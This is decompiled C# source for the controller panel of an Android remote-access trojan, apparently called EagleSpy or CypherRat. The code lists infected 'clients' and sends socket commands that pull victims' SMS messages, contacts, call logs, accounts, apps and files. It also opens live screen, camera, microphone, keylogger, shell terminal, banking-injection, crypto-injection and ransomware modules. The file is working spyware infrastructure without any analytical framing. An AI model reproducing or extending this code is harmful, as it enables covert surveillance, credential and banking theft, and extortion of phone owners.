						this.ClientsWindow.Rows[num].Cells[6].Tag = client.UUID;
						this.ClientsWindow.Rows[num].Cells[2].Tag = client.UUID;
						Data._clientRowIndices[client.UUID] = client;
						this.ClientsWindow.Rows[num].Cells[15].Style.ForeColor = Color.Lime;
						string text = string.Concat(new string[]
						{
							"Client-Info\r\nName:",
							client.ClientName,
							"\r\nDefender:",
							client.ClientDefender,
							"\r\nFrom:",
							client.Country,
							"\r\nHost:",
							array[6],
							"\r\nip:",
							array[0],
							"\r\nAndorid:",
							client.android,
							"\r\nPort:",
							array[1],
							"\r\n"
						});
						this.ClientsWindow.Rows[num].Cells[0].ToolTipText = text;
						if (Operators.CompareString(SpySettings.SOHW_ALERT, "Yes", false) == 0)
						{
							string text2 = "Name: " + client.ClientName + "\r\nCountry: " + client.Country;
							EagleAlert.ShowCustome(text2, client.Wallpaper, Color.Black, Color.Lime);
						}
					}
				}
				this.UpdateForms(client);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004AA RID: 1194 RVA: 0x0006066C File Offset: 0x0005E86C
		public void RemoveCard(DataGridViewRow row, string uuid)
		{
			EagleSpyMain._Closure_0024__56_002D0 closure_0024__56_002D = null;
			EagleSpyMain._Closure_0024__56_002D0 CS_0024_003C_003E8__locals0 = new EagleSpyMain._Closure_0024__56_002D0(closure_0024__56_002D);
			CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
			CS_0024_003C_003E8__locals0._0024VB_0024Local_row = row;
			CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid = uuid;
			if (base.InvokeRequired)
			{
				base.Invoke(new VB_0024AnonymousDelegate_0(delegate
				{
					CS_0024_003C_003E8__locals0._0024VB_0024Me.RemoveCard(CS_0024_003C_003E8__locals0._0024VB_0024Local_row, CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid);
				}));
				return;
			}
			try
			{
				string text = "null";
				try
				{
					if (CS_0024_003C_003E8__locals0._0024VB_0024Local_row != null)
					{
						text = Conversions.ToString(CS_0024_003C_003E8__locals0._0024VB_0024Local_row.Cells[6].Tag);
						this.ClientsWindow.Rows.Remove(CS_0024_003C_003E8__locals0._0024VB_0024Local_row);
						Dictionary<string, Client> clientRowIndices = Data._clientRowIndices;
						lock (clientRowIndices)
						{
							if (Data._clientRowIndices.ContainsKey(CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid))
							{
								Data._clientRowIndices.Remove(CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid);
							}
						}
					}
				}
				catch (Exception)
				{
				}
				if (Operators.CompareString(text, "null", false) != 0 && Operators.CompareString(text, "null", false) != 0)
				{
					string text2 = "Calls_Manager_" + text;
					Form form = MyProject.Application.OpenForms[text2];
					string[] array = new string[] { "Close windows", "Disconnected ---> " };
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text3 = form.Text;
							form.Text = array[1] + text3;
						}
					}
					text2 = "Live_Screen_" + text;
					Button5 button = (Button5)MyProject.Application.OpenForms[text2];
					if (button != null)
					{
						button.Done(new object[] { "Connection lost..." });
						button.Livepicbox.Image = Resources.disconnected;
					}
					text2 = "SMS_Manager_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text4 = form.Text;
							form.Text = array[1] + text4;
						}
					}
					text2 = "Contacts_Manager_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text5 = form.Text;
							form.Text = array[1] + text5;
						}
					}
					text2 = "Camera_Manager_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text6 = form.Text;
							form.Text = array[1] + text6;
							((CameraManager)form).CAM0.Image = Resources.disconnected;
						}
					}
					try
					{
						text2 = "File_Manager_File" + CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid;
						form = MyProject.Application.OpenForms[text2];
						if (form != null && !form.IsDisposed)
						{
							FileManager fileManager = (FileManager)form;
							string text7 = form.Text;
							form.Text = array[1] + text7;
							foreach (object obj in ((IEnumerable)fileManager.DGVDATA.Rows))
							{
								DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
								try
								{
									if (Operators.ConditionalCompareObjectEqual(dataGridViewRow.Cells[4].Value, "Downloading..", false))
									{
										dataGridViewRow.Cells[4].Value = "Wating..";
									}
								}
								catch (Exception)
								{
								}
							}
						}
					}
					catch (Exception)
					{
					}
					text2 = "Microphone_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text8 = form.Text;
							form.Text = array[1] + text8;
						}
					}
					text2 = "SM_Hunter_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						string text9 = form.Text;
						form.Text = array[1] + text9;
					}
					text2 = "Shell_Terminal_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text10 = form.Text;
							form.Text = array[1] + text10;
						}
					}
					text2 = "Location_Manager_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text11 = form.Text;
							form.Text = array[1] + text11;
						}
					}
					text2 = "Applications_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text12 = form.Text;
							form.Text = array[1] + text12;
						}
					}
					text2 = "Account_Manager_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text13 = form.Text;
							form.Text = array[1] + text13;
						}
					}
					text2 = "informations_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text14 = form.Text;
							form.Text = array[1] + text14;
						}
					}
					text2 = "Keylogger_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text15 = form.Text;
							form.Text = array[1] + text15;
						}
					}
					text2 = "lockscreen_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text16 = form.Text;
							form.Text = array[1] + text16;
						}
					}
					text2 = "injection_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text17 = form.Text;
							form.Text = array[1] + text17;
						}
					}
					text2 = "bankingInjections" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text18 = form.Text;
							form.Text = array[1] + text18;
						}
					}
					text2 = "ransomeware_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text19 = form.Text;
							form.Text = array[1] + text19;
						}
					}
					text2 = "Clipboard_Manager_" + text;
					form = MyProject.Application.OpenForms[text2];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text20 = form.Text;
							form.Text = array[1] + text20;
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004AB RID: 1195 RVA: 0x00060FD4 File Offset: 0x0005F1D4
		private void UsersToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.WU != null)
			{
				return;
			}
			this.WU = new Win_Users();
			string text = reso.res_Path + "\\Users";
			if (Directory.Exists(text))
			{
				string[] directories = Directory.GetDirectories(text);
				string[] array = directories;
				string[] array2 = array;
				foreach (string text2 in array2)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(text2);
					string text3 = directoryInfo.FullName + "\\user.info";
					if (File.Exists(text3))
					{
						try
						{
							string[] array4 = File.ReadAllLines(text3);
							if (array4.Length == 3)
							{
								string text4 = reso.res_Path + "\\Icons\\FillEllipse\\User.png";
								this.WU.DGV0.Rows.Add(new object[]
								{
									array4[0],
									array4[2] + " /ip:" + array4[1],
									directoryInfo.Name,
									reso.GetEllImage(0, new object[] { text4, 15, 15, 17, 17 })
								});
							}
						}
						catch (Exception)
						{
						}
					}
				}
			}
			this.WU.DGV0.Columns[3].Width = 48;
			this.WU.DGV0.Columns[3].DisplayIndex = 0;
			this.WU.StartPosition = FormStartPosition.Manual;
			this.WU.Location = Codes.FixSize(this, this.WU);
			this.WU.Show();
		}

		// Token: 0x060004AC RID: 1196 RVA: 0x00002423 File Offset: 0x00000623
		private void AngelAndroidForm_FormClosing(object sender, FormClosingEventArgs e)
		{
		}

		// Token: 0x060004AD RID: 1197 RVA: 0x00002D2D File Offset: 0x00000F2D
		private void Button1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x060004AE RID: 1198 RVA: 0x00002D24 File Offset: 0x00000F24
		private void Button2_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x060004AF RID: 1199 RVA: 0x0000371B File Offset: 0x0000191B
		private void Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060004B0 RID: 1200 RVA: 0x00061188 File Offset: 0x0005F388
		private void Label2_MouseDown(object sender, MouseEventArgs e)
		{
			this.mov = true;
			this.Min = Control.MousePosition.Y;
			this.Mx = Control.MousePosition.X;
			this.Sw = base.Width;
			this.Sh = base.Height;
		}

		// Token: 0x060004B1 RID: 1201 RVA: 0x000611DC File Offset: 0x0005F3DC
		private void Label2_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.mov)
			{
				base.Height = checked(Control.MousePosition.Y - this.Min + this.Sh);
			}
		}

		// Token: 0x060004B2 RID: 1202 RVA: 0x00003743 File Offset: 0x00001943
		private void Label2_MouseUp(object sender, MouseEventArgs e)
		{
			this.mov = false;
		}

		// Token: 0x060004B3 RID: 1203 RVA: 0x00061214 File Offset: 0x0005F414
		private void DrakeUIAvatar2_Click(object sender, EventArgs e)
		{
			if (!Versioned.IsNumeric(this.porttext.Text))
			{
				EagleAlert.ShowWarning("Only Enter Number : 4444");
				return;
			}
			if (this.DGVSERVS.Rows.Count > 0)
			{
				foreach (object obj in ((IEnumerable)this.DGVSERVS.Rows))
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					if (dataGridViewRow.Tag != null && Operators.CompareString(dataGridViewRow.Tag.ToString(), this.porttext.Text, false) == 0)
					{
						EagleAlert.Showinformation("this port already added");
						return;
					}
				}
			}
			if ((Conversions.ToInteger(this.porttext.Text) < 1000) | (Conversions.ToInteger(this.porttext.Text) > 49151))
			{
				EagleAlert.Showinformation("Please Select port between 1000 - 49151");
				return;
			}
			int num = this.DGVSERVS.Rows.Add(new object[]
			{
				Resources.swtchoff,
				this.porttext.Text,
				"OFF",
				this.passtxt.Text
			});
			this.DGVSERVS.Rows[num].Cells[2].Style.ForeColor = Color.Red;
			this.DGVSERVS.Rows[num].Cells[0].Tag = "OFF";
			this.DGVSERVS.Rows[num].Tag = this.porttext.Text;
			this.porttext.Text = "";
		}

		// Token: 0x060004B4 RID: 1204 RVA: 0x0000374C File Offset: 0x0000194C
		private void DrakeUIAvatar3_Click(object sender, EventArgs e)
		{
			if (this.DataLog.Rows.Count > 0)
			{
				this.DataLog.Rows.Clear();
			}
		}

		// Token: 0x060004B5 RID: 1205 RVA: 0x000613D4 File Offset: 0x0005F5D4
		private void DrakeUIAvatar8_Click(object sender, EventArgs e)
		{
			this.infotitlepanel.BringToFront();
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				this.bigtitletext.Text = "لوحة رئيسية";
				return;
			}
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				this.bigtitletext.Text = "Dashboard";
				return;
			}
			this.bigtitletext.Text = "主面板";
		}

		// Token: 0x060004B6 RID: 1206 RVA: 0x00049C80 File Offset: 0x00047E80
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (e.Button == MouseButtons.Left)
				{
					Codes.ReleaseCapture();
					Codes.SendMessage(base.Handle, 161, 2, 0);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004B7 RID: 1207 RVA: 0x00002423 File Offset: 0x00000623
		private void DrakeUIAvatar9_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060004B8 RID: 1208 RVA: 0x00061440 File Offset: 0x0005F640
		private void CypherRat_Deactivate(object sender, EventArgs e)
		{
			try
			{
				this.isactive = false;
				base.ActiveControl = this.ClientsWindow;
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004B9 RID: 1209 RVA: 0x00049C80 File Offset: 0x00047E80
		private void Panel3_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (e.Button == MouseButtons.Left)
				{
					Codes.ReleaseCapture();
					Codes.SendMessage(base.Handle, 161, 2, 0);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004BA RID: 1210 RVA: 0x00061478 File Offset: 0x0005F678
		public void updaterows(object[] objs)
		{
			if (base.InvokeRequired)
			{
				EagleSpyMain.updateuiD updateuiD = new EagleSpyMain.updateuiD(this.updaterows);
				base.Invoke(updateuiD, new object[] { objs });
				return;
			}
			try
			{
				Client client = (Client)objs[0];
				DataGridViewRow dataGridViewRow = (DataGridViewRow)objs[1];
				try
				{
					if (dataGridViewRow == null)
					{
						return;
					}
					if ((client.Statistics == null) | (Operators.CompareString(client.Statistics, "null", false) == 0))
					{
						dataGridViewRow.Cells[15].Value = "Bing...";
					}
					else
					{
						dataGridViewRow.Cells[15].Value = client.Statistics;
					}
				}
				catch (Exception)
				{
				}
				dataGridViewRow.Cells[12].Value = client.ActiveNow;
				dataGridViewRow.Cells[1].Value = client.Wallpaper;
				dataGridViewRow.Cells[0].Value = reso.GetScreen(client.Screen);
				dataGridViewRow.Cells[10].Value = reso.GetBattery(client.Battery);
				dataGridViewRow.Cells[11].Value = client.Wifi;
				if (client.isnewcall)
				{
					dataGridViewRow.Cells[9].Value = Resources.new_call;
				}
				if (client.isnewnotifi)
				{
					dataGridViewRow.Cells[8].Value = Resources.new_notifi;
				}
				if (client.IsAdminActive)
				{
					dataGridViewRow.Cells[14].Value = reso.CheckAdmin(client.IsAdminActive);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004BB RID: 1211 RVA: 0x0006163C File Offset: 0x0005F83C
		private void CypherRat_Activated(object sender, EventArgs e)
		{
			try
			{
				this.isactive = true;
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004BC RID: 1212 RVA: 0x00061668 File Offset: 0x0005F868
		private void FILESMANAGER()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								object[] array = new object[]
								{
									client.myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".files",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getfiles,
										Data.SPL_SOCKET,
										"files",
										Data.SPL_DATA,
										"get0"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004BD RID: 1213 RVA: 0x000617F8 File Offset: 0x0005F9F8
		private void SMSMANAGER()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".sms",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getSMS,
										Data.SPL_SOCKET,
										"sms",
										Data.SPL_DATA,
										"content://sms/"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004BE RID: 1214 RVA: 0x0006198C File Offset: 0x0005FB8C
		private void CONTACTSLIST()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".contacts",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getContacts,
										Data.SPL_SOCKET,
										"contacts"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception ex)
					{
						Clipboard.SetText(ex.ToString());
						MessageBox.Show(ex.ToString());
					}
				}
			}
			catch (Exception ex2)
			{
				Clipboard.SetText(ex2.ToString());
				MessageBox.Show(ex2.ToString());
			}
		}

		// Token: 0x060004BF RID: 1215 RVA: 0x00061B40 File Offset: 0x0005FD40
		private void APPLICATIONSMANAGER()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						Client client = (Client)dataGridViewRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] array = new object[]
							{
								myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".apps",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.Apps,
									Data.SPL_SOCKET,
									"apps"
								}),
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(array);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004C0 RID: 1216 RVA: 0x00061C88 File Offset: 0x0005FE88
		private void ACCOUNTS()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".info",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.Account,
										Data.SPL_SOCKET,
										"account"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004C1 RID: 1217 RVA: 0x00061E08 File Offset: 0x00060008
		private void CALLSMANAGER()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".calls",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getCalls,
										Data.SPL_SOCKET,
										"calls"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004C2 RID: 1218 RVA: 0x00061F88 File Offset: 0x00060188
		private void LIVESCREEN()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "Live_Screen_" + client.ClientRemoteAddress;
								if ((Button5)MyProject.Application.OpenForms[text] == null)
								{
									new Button5
									{
										Name = text,
										Title = string.Format("{0} - IP:{1}", "Live Screen", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004C3 RID: 1219 RVA: 0x00062108 File Offset: 0x00060308
		private void CRYPTOINJECTION()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "injection_" + client.ClientRemoteAddress;
								if ((Injection)MyProject.Application.OpenForms[text] == null)
								{
									new Injection
									{
										Name = text,
										Title = string.Format("{0} - IP:{1}", "Live Screen", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004C4 RID: 1220 RVA: 0x00062254 File Offset: 0x00060454
		private void SCREENREADERV2()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "SC_Readv2_" + client.ClientAddressIP;
								if ((ScreenReaderV2)MyProject.Application.OpenForms[text] == null)
								{
									new ScreenReaderV2
									{
										Name = text,
										Title = string.Format("{0} - IP:{1}", "Screen Reader V2", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004C5 RID: 1221 RVA: 0x000623C8 File Offset: 0x000605C8
		private void CAMERAMANAGER()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[] { ':' });
								int num = 0;
								int num2 = 0;
								if (client.Isv4)
								{
									object[] array2 = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient2,
											Data.SPL_SOCKET,
											"lcm<*>",
											client.ClientRemoteAddress,
											Data.SPL_SOCKET,
											array[0],
											Data.SPL_SOCKET,
											array[1],
											Data.SPL_SOCKET,
											SecurityKey.Lockscreen,
											Data.SPL_SOCKET,
											Conversions.ToString(num),
											Data.SPL_SOCKET,
											Conversions.ToString(num2),
											Data.SPL_SOCKET,
											Data.SPL_ARRAY,
											Data.SPL_SOCKET,
											client.ClientRemoteAddress
										}),
										Codes.Encoding().GetBytes("null"),
										client
									};
									client.SendMessage(array2);
								}
								else
								{
									string text = "Camera_Manager_" + client.ClientRemoteAddress;
									CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[text];
									if (cameraManager != null)
									{
										break;
									}
									cameraManager = new CameraManager();
									cameraManager.Name = text;
									cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", client.ClientAddressIP);
									cameraManager.classClient = client;
									if (cameraManager.classClient != null)
									{
										reso.Directory_Exist(cameraManager.classClient);
										cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
									}
									cameraManager.Client = client.myClient;
									cameraManager.classCamera = client;
									cameraManager.TempImage = new PictureBox();
									cameraManager.combotext.Visible = false;
									cameraManager.combosizes.Visible = false;
									cameraManager.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004C6 RID: 1222 RVA: 0x0006268C File Offset: 0x0006088C
		private void MICROPHONEACCESS()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string text = "Microphone_" + client.ClientRemoteAddress;
								if ((Microphone)MyProject.Application.OpenForms[text] == null)
								{
									string[] array = client.Keys.Split(new char[] { ':' });
									if (array.Length < infoServer.KeySize)
									{
										break;
									}
									object[] array2 = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient1,
											Data.SPL_SOCKET,
											reso.domen,
											".microphone",
											Data.SPL_SOCKET,
											"method",
											Data.SPL_SOCKET,
											SecurityKey.resultClient,
											Data.SPL_SOCKET,
											"start",
											Data.SPL_DATA,
											array[0],
											Data.SPL_DATA,
											array[1],
											Data.SPL_DATA,
											"8000",
											Data.SPL_DATA,
											SecurityKey.MicwaveOutByte,
											Data.SPL_DATA,
											client.ClientRemoteAddress,
											Data.SPL_DATA,
											"0"
										}),
										Codes.Encoding().GetBytes("null"),
										client
									};
									client.SendMessage(array2);
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004C7 RID: 1223 RVA: 0x000628D4 File Offset: 0x00060AD4
		private void KEYLOGGER()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							string text = "Keylogger_" + client.ClientRemoteAddress;
							Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms[text];
							if (client != null && keylogger == null)
							{
								keylogger = new Keylogger();
								keylogger.Name = text;
								keylogger.Title = string.Format("{0} - IP:{1}", "Keylogger", client.ClientAddressIP);
								keylogger.Client = client.myClient;
								keylogger.classClient = client;
								keylogger.DGV0.Columns[3].Width = 48;
								keylogger.DGV0.Columns[3].DisplayIndex = 0;
								keylogger.tmpAddressIP = client.ClientAddressIP;
								keylogger.tmpClientName = client.ClientName;
								keylogger.tmpCountry = client.Country;
								keylogger.tmpFolderUSER = client.FolderUSER;
								client.Keylogg = true;
								keylogger.Show();
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

